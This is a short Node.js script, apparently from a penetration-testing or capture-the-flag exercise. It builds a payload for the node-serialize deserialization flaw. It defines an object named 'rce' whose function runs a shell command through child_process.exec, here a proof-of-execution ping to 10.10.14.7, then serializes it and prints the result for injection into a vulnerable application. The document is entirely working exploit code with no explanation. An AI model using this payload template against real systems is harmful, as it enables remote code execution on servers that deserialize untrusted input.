var y = {
 "rce": function(){ require('child_process').exec('ping -c 4 10.10.14.7', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
